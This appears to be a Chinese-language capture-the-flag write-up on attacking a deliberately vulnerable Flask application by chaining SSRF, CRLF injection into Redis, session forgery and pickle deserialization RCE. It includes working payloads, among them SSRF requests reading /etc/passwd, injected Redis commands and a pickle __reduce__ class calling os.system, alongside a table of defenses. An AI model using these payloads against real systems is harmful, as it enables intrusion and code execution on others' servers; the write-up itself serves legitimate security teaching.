这是一道 **Web安全渗透测试** 题目，目标是对一个存在多个漏洞的 Flask Web 应用进行攻击，最终获取服务器控制权。

## 三、漏洞分析

### 3.1 漏洞一：SSRF（服务端请求伪造）

**漏洞位置**：`/api/avatar/download?url=`

**漏洞原理**：
- 服务端接收用户传入的 URL 参数
- 服务端代替用户去请求该 URL
- 未对 URL 协议和目标地址做限制

**利用方式**：

```
正常请求：/api/avatar/download?url=http://example.com/avatar.jpg
攻击请求：/api/avatar/download?url=file:///etc/passwd
攻击请求：/api/avatar/download?url=http://127.0.0.1:6379/
```

**危害**：
- 读取服务器本地文件（file://协议）
- 访问内网服务（探测、攻击）
- 绕过防火墙限制

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  攻击者  │────────▶│  Web服务 │────────▶│ 内网资源 │
│          │  SSRF   │  (代理)  │  请求   │ Redis等  │
└──────────┘         └──────────┘         └──────────┘
     │                     │                    │
     │   url=file:///etc   │   读取本地文件     │
     │   url=http://127... │   访问内网服务     │
```

### 3.2 漏洞二：CRLF 注入

**漏洞原理**：
- HTTP 协议使用 `\r\n`（CRLF）作为行分隔符
- Redis 协议也使用 `\r\n` 分隔命令
- 通过 URL 编码 `%0d%0a` 注入换行符

**利用方式**：

```
正常 Redis 命令：
AUTH password
SAVE

注入 URL：
http://127.0.0.1:6379/%0d%0aAUTH%20redispass123%0d%0aSAVE%0d%0a

解码后变成：
GET /
AUTH redispass123
SAVE

HTTP请求
```

**攻击流程图**：

```

│                        CRLF 注入过程                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  攻击者构造 URL:                                                 │
│  http://127.0.0.1:6379/%0d%0aAUTH%20pass%0d%0aSAVE%0d%0a        │
│                                                                  │
│                          ▼                                       │
│                                                                  │
│  Web服务器发起请求，Redis收到:                                   │
│  ┌────────────────────────────┐                                 │
```

### 3.4 漏洞四：Pickle 反序列化 RCE

**漏洞原理**：
- Python `pickle` 模块可以序列化/反序列化对象
- `pickle.loads()` 会执行对象的 `__reduce__` 方法
- 攻击者可构造恶意对象，反序列化时执行任意命令

**恶意 Payload 构造**：

```python
class PickleRCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))

# 序列化后写入 Redis
payload = pickle.dumps(PickleRCE("id > /tmp/result.txt"))
```

## 六、涉及的安全知识点

### 6.1 漏洞类型

| 漏洞 | 英文全称 | 危害等级 |
|------|----------|----------|
| SSRF | Server-Side Request Forgery | 高危 |
| CRLF注入 | Carriage Return Line Feed Injection | 中危 |
| Session伪造 | Session Forgery | 高危 |
| 反序列化RCE | Insecure Deserialization | 严重 |

### 6.2 涉及技术

- **Flask 框架**：Python Web 框架，使用 itsdangerous 签名 Session
- **Redis**：内存数据库，常用于缓存和会话存储
- **Pickle**：Python 对象序列化模块，存在反序列化漏洞
- **URL编码**：`%0d%0a` = `\r\n` (CRLF)

### 6.3 防御措施

| 漏洞 | 防御方法 |
|------|----------|
| SSRF | 限制协议白名单(仅http/https)、禁止访问内网IP、URL白名单校验 |
| CRLF | 过滤 `\r\n` 字符、升级Python版本 |
| Session伪造 | 使用强随机 secret_key、定期轮换、服务端存储Session |
| 反序列化 | 禁用 pickle、使用 JSON 替代、输入校验 |

## 七、总结

这道题考察的是一个**多漏洞链式利用**的场景：

```
入口漏洞(SSRF) → 信息收集 → 协议注入(CRLF) → 权限提升(Session伪造) → 代码执行(RCE) → 横向移动(MCP)
```

每个漏洞单独看危害有限，但组合起来形成完整攻击链，最终实现从**普通用户**到**服务器控制权**的提升。

这是渗透测试中非常典型的攻击思路：**找到入口 → 收集信息 → 提升权限 → 横向扩展**。
